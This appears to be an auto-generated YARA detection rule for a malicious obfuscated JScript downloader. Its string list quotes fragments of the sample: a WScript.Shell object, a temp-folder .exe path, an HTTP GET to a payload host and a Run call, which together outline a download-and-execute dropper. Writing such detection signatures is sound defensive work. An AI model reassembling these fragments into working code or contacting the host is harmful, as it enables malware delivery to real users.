rule sig_20160328_050eb45670933fe0cf2b35ed05f24d70 {
  meta:
    description = "datamaliciousorder - file 20160328_050eb45670933fe0cf2b35ed05f24d70.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "168abd55ae3b47f217fbaf6c0ef2807608d37de516d0368a49e5af8aae744030"

  strings:
    $s1  = "function Etobcpb() {return Bubkkqrgch[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4uI30iMgfPHb9.exe\";};" fullword ascii
    $s2  = "Twcaekig[Yycuonn](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "function Sqefiwqp(Uqrsmvvsgc, Lbwpvx){return Uqrsmvvsgc - Lbwpvx;};" fullword ascii
    $s4  = "var Bubkkqrgch = function Djsmqskvzn() {return WScript[Vzydvgv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "do {WScript[Cucvpecu](Ilpqwlcfmv() * 11)} while (Twcaekig[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Lbjwhijqur() {return ((Lninltkbm == true) && (Lninltkbm == Nzckopnp)) ? 1 : Luuokm;};" fullword ascii
    $s7  = "function Zldwft(Hejqxnp){Bubkkqrgch[\"Run\"](Hejqxnp, Luuokm, Luuokm);};" fullword ascii
    $s8  = "function Ohhnc(){return Bxbtsg;};" fullword ascii
    $s9  = " while (Chgzsbbr){" fullword ascii
    $s10 = "return Sqefiwqp(Jmfevnmc, Ocuyyuiu);" fullword ascii
    $s11 = "var Yjnaypjhkt = new this[\"Date\"]();" fullword ascii
    $s12 = "var Nzckopnp = false;" fullword ascii
    $s13 = "function Mbhgy(Qsmhzbk) {var Iwulm = (1, 2, 3, 4, 5, Qsmhzbk); return Iwulm;};" fullword ascii
    $s14 = "Lninltkbm = true; " fullword ascii
    $s15 = "var Lninltkbm = false;" fullword ascii
    $s16 = "Nzckopnp = true; " fullword ascii
    $s17 = "var Wyssribzj = false;" fullword ascii
    $s18 = "function Kkwsbalje(){return Vzydvgv;};" fullword ascii
    $s19 = "function Hjtpxm()" fullword ascii
    $s20 = "function Ilpqwlcfmv(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}